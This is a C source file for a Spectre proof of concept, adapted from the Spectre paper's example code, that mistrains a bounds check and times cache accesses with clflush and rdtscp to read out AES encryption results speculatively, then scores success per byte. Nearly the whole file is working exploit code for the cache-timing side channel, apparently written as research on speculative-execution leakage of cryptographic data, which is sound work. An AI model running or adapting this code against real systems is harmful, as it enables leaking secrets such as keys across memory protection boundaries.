/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "portable/we_portable.h"
#ifdef _MSC_VER
#include <windows.h>
#include <wmmintrin.h>
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif

extern void AES_128_encrypt(unsigned char *out, unsigned char *in);
extern void AES_128_encrypt_intrin(unsigned char *out, unsigned char *in);
extern void AES_encrypt_round1(const unsigned char *in, unsigned char *out);
extern void AES_encrypt_intrin_round1(const unsigned char *in, unsigned char *out);
extern void victim_function_aes_intrin(size_t x1);
extern void victim_function_aes_intrin_round1(size_t x1);
extern void victim_function_aes(size_t x1);
extern void victim_function_aes_round1(size_t x1);

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
	1,
	2,
	3,
	4,
	5,
	6,
	7,
	8,
	9,
	10,
	11,
	12,
	13,
	14,
	15,
	16
};
uint8_t unused2[64];
uint8_t array2[256 * 512 * 16];

//uint32_t sec[] = { 0x1c1c1c1c, 0x80880080, 0xc4c4c4c4, 0x4c4c4c4c };
char* buf = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char* sec = "\x1a\x1b\x1c\x1d\x80\x88\x00\x80\xc4\xc4\xc4\xc4\x4c\x4c\x4c\x4c";

uint8_t tmp = 0; /* Used so compiler won't optimize out victim_function() */


/********************************************************************
Analysis code
********************************************************************/
#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
	float * p = (float *)addr;
	float c = 0.f;
	__m128 i = _mm_setr_ps(c, c, c, c);

	int k, l;
	/* Non-sequential memory addressing by looping through k by l */
	for (k = 0; k < 4; k++)
		for (l = 0; l < 4; l++)
			_mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

#ifndef NOCLFLUSH
#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
_mm_clflush(&array1_size);\
for (volatile int z = 0; z < 100; z++) {}\
x = ((j % 6) - 1) & ~0xFFFF;\
x = (x | (x >> 16));\
x = training_x ^ (x & (malicious_x ^ training_x));\
Func(x);\
}
#else
#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {\
	junk2 = cache_flush_array[l];\
}\
for (volatile int z = 0; z < 100; z++) {}\
x = ((j % 6) - 1) & ~0xFFFF;\
x = (x | (x >> 16));\
x = training_x ^ (x & (malicious_x ^ training_x));\
Func(x);\
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemory128(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 * 16], int score[2 * 16], int idx) {
	static int results[16][256];
	int tries, i, i2, j, jj[16], k[16], mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t * addr;

#ifdef NOCLFLUSH
	int junk2 = 0;
	int l;
#endif

	for (i2 = 0; i2 < 16; i2++) {
		for (i = 0; i < 256; i++) {
			results[i2][i] = 0;
		}
	}
	for (tries = 999; tries > 0; tries--) {

#ifndef NOCLFLUSH
		/* Flush array2[256*(0..255)] from cache */
		for (i2 = 0; i2 < 16; i2++) {
			for (i = 0; i < 256; i++) {
				_mm_clflush(&array2[i2 * 512 * 256 + i * 512]); /* intrinsic for clflush instruction */
			}
		}
#else
		/* Flush array2[256*(0..255)] from cache
		using long SSE instruction several times */
		for (j = 0; j < 16; j++)
			for (i2 = 0; i2 < 16; i2++) {
				for (i = 0; i < 256; i++) {
					flush_memory_sse(&array2[i2 * 512 * 256 + i * 512]);
				}
			}
#endif

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		unsigned char c[16];

 		if (idx == 0) { AES_128_encrypt(c, &array1[training_x]);
			TrainCall(victim_function_aes); }
		else if (idx == 1) { AES_128_encrypt_intrin(c, &array1[training_x]); 
			TrainCall(victim_function_aes_intrin); }
		else if (idx == 2) { AES_encrypt_round1(&array1[training_x], c);
			TrainCall(victim_function_aes_round1); }
		else if (idx == 3) { AES_encrypt_intrin_round1(&array1[training_x], c);
			TrainCall(victim_function_aes_intrin_round1); }

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i2 = 0; i2 < 16; i2++) {
			for (i = 0; i < 256; i++) {
				mix_i = ((i * 167) + 13) & 255;
				addr = &array2[i2 * 512 * 256 + mix_i * 512];

				/*
				We need to accuratly measure the memory access to the current index of the
				array so we can determine which index was cached by the malicious mispredicted code.

				The best way to do this is to use the rdtscp instruction, which measures current
				processor ticks, and is also serialized.
				*/

#ifndef NORDTSCP
				time1 = __rdtscp(&junk); /* READ TIMER */
				junk = *addr; /* MEMORY ACCESS TO TIME */
				time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#else

				/*
				The rdtscp instruction was instroduced with the x86-64 extensions.
				Many older 32-bit processors won't support this, so we need to use
				the equivalent but non-serialized tdtsc instruction instead.
				*/

#ifndef NOMFENCE
				/*
				Since the rdstc instruction isn't serialized, newer processors will try to
				reorder it, ruining its value as a timing mechanism.
				To get around this, we use the mfence instruction to introduce a memory
				barrier and force serialization. mfence is used because it is portable across
				Intel and AMD.
				*/

				_mm_mfence();
				time1 = __rdtsc(); /* READ TIMER */
				_mm_mfence();
				junk = *addr; /* MEMORY ACCESS TO TIME */
				_mm_mfence();
				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
				_mm_mfence();
#else
				/*
				The mfence instruction was introduced with the SSE2 instruction set, so
				we have to ifdef it out on pre-SSE2 processors.
				Luckily, these older processors don't seem to reorder the rdtsc instruction,
				so not having mfence on older processors is less of an issue.
				*/

				time1 = __rdtsc(); /* READ TIMER */
				junk = *addr; /* MEMORY ACCESS TO TIME */
				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#endif
				if (time2 <= cache_hit_threshold && mix_i != c[(i2 & 12) + (3 - (i2 & 3))])//array1[tries % array1_size]) //(i2 / 4) * 4 + (3 - i2 % 4)
					results[i2][mix_i]++; /* cache hit - add +1 to score for this value */
			}
		}

		for (i2 = 0; i2 < 16; i2++) {
			/* Locate highest & second-highest results results tallies in j/k */
			jj[i2] = k[i2] = -1;
			for (i = 0; i < 256; i++) {
				if (jj[i2] < 0 || results[i2][i] >= results[i2][jj[i2]]) {
					k[i2] = jj[i2];
					jj[i2] = i;
				}
				else if (k[i2] < 0 || results[i2][i] >= results[i2][k[i2]]) {
					k[i2] = i;
				}
			}
		}

		int b = !0;
		for (i2 = 0; i2 < 16; i2++) {
			b = b && (results[i2][jj[i2]] >= (2 * results[i2][k[i2]] + 5) || (results[i2][jj[i2]] == 2 && results[i2][k[i2]] == 0));
		}
		if (b)
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	for (i2 = 0; i2 < 16; i2++) {
		value[i2 << 1] = (uint8_t)jj[i2];
		score[i2 << 1] = results[i2][jj[i2]];
		value[(i2 << 1) + 1] = (uint8_t)k[i2];
		score[(i2 << 1) + 1] = results[i2][k[i2]];
		results[i2][0] ^= junk; /* use junk so code above won't get optimized out*/
	}
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/
int main(int argc,
	const char * * argv) {

	/* Default to a cache hit threshold of 80 */
	int cache_hit_threshold = 80;

	/* Default for malicious_x is the secret string address */
	size_t malicious_x = 0;// (size_t)(secret - (char *)array1);

						   /* Default addresses to read is 40 (which is the length of the secret string) */
	int len = 16;

	int i;

#ifdef NOCLFLUSH
	for (i = 0; i < sizeof(cache_flush_array); i++) {
		cache_flush_array[i] = 1;
	}
#endif
	array1_size = 16;
	for (i = 0; i < sizeof(array2); i++) {
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	}

	/* Parse the cache_hit_threshold from the first command line argument.
	(OPTIONAL) */
	if (argc >= 2) {
		sscanf(argv[1], "%d", &cache_hit_threshold);
	}

	/* Parse the malicious x address and length from the second and third
	command line argument. (OPTIONAL) */
	if (argc >= 4) {
		sscanf(argv[2], "%p", (void * *)(&malicious_x));

		/* Convert input value into a pointer */
		malicious_x -= (size_t)array1;

		sscanf(argv[3], "%d", &len);
	}

	/* Print git commit hash */
#ifdef GIT_COMMIT_HASH
	printf("Version: commit " GIT_COMMIT_HASH "\n");
#endif

	/* Print cache hit threshold */
	printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

	/* Print build configuration */
	printf("Build: ");
#ifndef NORDTSCP
	printf("RDTSCP_SUPPORTED ");
#else
	printf("RDTSCP_NOT_SUPPORTED ");
#endif
#ifndef NOMFENCE
	printf("MFENCE_SUPPORTED ");
#else
	printf("MFENCE_NOT_SUPPORTED ");
#endif
#ifndef NOCLFLUSH
	printf("CLFLUSH_SUPPORTED ");
#else
	printf("CLFLUSH_NOT_SUPPORTED ");
#endif

	printf("\n");

	printf("Reading %d bytes:\n", len);

	//malicious_x = (size_t)((char*)buf - (char *)array1);

	/* Default addresses to read is 40 (which is the length of the secret string) */

	int scores[2 * 16];
	uint8_t values[2 * 16];

	LARGE_INTEGER start;
	LARGE_INTEGER stop;
	LARGE_INTEGER frequency;
	QueryPerformanceFrequency(&frequency);

	//while (--len >= 0) {
		//printf("Reading at malicious_x = %p... ", (void *)malicious_x);
	for (int j = 0; j < 4; j++) {
		char outbuf[16];
		QueryPerformanceCounter(&start);
		for (int k = 0; k < 10000; k++) {
			if (j == 0) {
				AES_128_encrypt(outbuf, sec);
			} else if (j == 1) {
				AES_128_encrypt_intrin(outbuf, sec);
			} else if (j == 2) {
				AES_encrypt_round1(sec, outbuf);
			} else {
				AES_encrypt_intrin_round1(sec, outbuf);
			}
		}
		QueryPerformanceCounter(&stop);
		if (j == 0 || j == 2) {
			printf("Correct AES = 0x%08X%08X%08X%08X... ", ((uint32_t*)outbuf)[0], ((uint32_t*)outbuf)[1], ((uint32_t*)outbuf)[2], ((uint32_t*)outbuf)[3]);
		} else {
			printf("Correct AES Intrinsic = 0x%08X%08X%08X%08X... ", ((uint32_t*)outbuf)[0], ((uint32_t*)outbuf)[1], ((uint32_t*)outbuf)[2], ((uint32_t*)outbuf)[3]);
		}
		printf("Time: %lf seconds\n", (double)(stop.QuadPart - start.QuadPart) / (double)frequency.QuadPart);
		char c[16];
		int succ = 0, conf = 0;
		LARGE_INTEGER tot = { 0 };
		for (int i = 0; i < 10; i++) {
			for (int k = 0; k < 16; k++) c[k] = sec[k];
			malicious_x = (size_t)(c - (char *)array1);
			QueryPerformanceCounter(&start);
			//for (int k = 0; k < 10; k++) {
				readMemory128(cache_hit_threshold, malicious_x, values, scores, j);
			//}
			QueryPerformanceCounter(&stop);
			//c[0] = values[0]; c[1] = values[2]; c[2] = values[4]; c[3] = values[6];
			//c[4] = values[8]; c[5] = values[10]; c[6] = values[12]; c[7] = values[14];
			//c[8] = values[16]; c[9] = values[18]; c[10] = values[20]; c[11] = values[22];
			//c[12] = values[24]; c[13] = values[26]; c[14] = values[28]; c[15] = values[30];

			/* Display the results */
			int IsSucc = (scores[0] >= 2 * scores[1] && scores[2] >= 2 * scores[3] &&
				scores[4] >= 2 * scores[5] && scores[6] >= 2 * scores[7] &&
				scores[8] >= 2 * scores[9] && scores[10] >= 2 * scores[11] &&
				scores[12] >= 2 * scores[13] && scores[14] >= 2 * scores[15] &&
				scores[16] >= 2 * scores[17] && scores[18] >= 2 * scores[19] &&
				scores[20] >= 2 * scores[21] && scores[22] >= 2 * scores[23] &&
				scores[24] >= 2 * scores[25] && scores[26] >= 2 * scores[27] &&
				scores[28] >= 2 * scores[29] && scores[30] >= 2 * scores[31]);
			printf("%s: ", IsSucc
				? "Success" : "Unclear");
			int IsEq = ((uint8_t)outbuf[3] == values[0] && (uint8_t)outbuf[2] == values[2] && (uint8_t)outbuf[1] == values[4] && (uint8_t)outbuf[0] == values[6] &&
				(uint8_t)outbuf[7] == values[8] && (uint8_t)outbuf[6] == values[10] && (uint8_t)outbuf[5] == values[12] && (uint8_t)outbuf[4] == values[14] &&
				(uint8_t)outbuf[11] == values[16] && (uint8_t)outbuf[10] == values[18] && (uint8_t)outbuf[9] == values[20] && (uint8_t)outbuf[8] == values[22] &&
				(uint8_t)outbuf[15] == values[24] && (uint8_t)outbuf[14] == values[26] && (uint8_t)outbuf[13] == values[28] && (uint8_t)outbuf[12] == values[30]) ? 1 : 0;
			printf("%s ", IsEq ? "Correct" : "Incorrect");
			if (IsEq) succ++;
			if (IsSucc && IsEq) conf++;
			printf("0x%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X score=%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d ",
				values[0], values[2], values[4], values[6],
				values[8], values[10], values[12], values[14],
				values[16], values[18], values[20], values[22],
				values[24], values[26], values[28], values[30],
				scores[0], scores[2], scores[4], scores[6],
				scores[8], scores[10], scores[12], scores[14],
				scores[16], scores[18], scores[20], scores[22],
				scores[24], scores[26], scores[28], scores[30]);

			if (scores[1] > 0 || scores[3] > 0 || scores[5] > 0 || scores[7] > 0 ||
				scores[9] > 0 || scores[11] > 0 || scores[13] > 0 || scores[15] > 0 ||
				scores[17] > 0 || scores[19] > 0 || scores[21] > 0 || scores[23] > 0 ||
				scores[25] > 0 || scores[27] > 0 || scores[29] > 0 || scores[31] > 0) {
				printf("(second best: 0x%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X score=%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d)",
					values[1], values[3], values[5], values[7],
					values[9], values[11], values[13], values[15],
					values[17], values[19], values[21], values[23],
					values[25], values[27], values[29], values[31],
					scores[1], scores[3], scores[5], scores[7],
					scores[9], scores[11], scores[13], scores[15],
					scores[17], scores[19], scores[21], scores[23],
					scores[25], scores[27], scores[29], scores[31]);
			}
			printf("  Time: %lf seconds\n", (double)(stop.QuadPart - start.QuadPart) / (double)frequency.QuadPart);
			tot.QuadPart += (stop.QuadPart - start.QuadPart);
			//printf("\n");
		}
		printf("Total Successes: %d Confidence Success: %d Time: %lf\n", succ, conf, (double)tot.QuadPart / (double)frequency.QuadPart);
	}
	return (0);
}
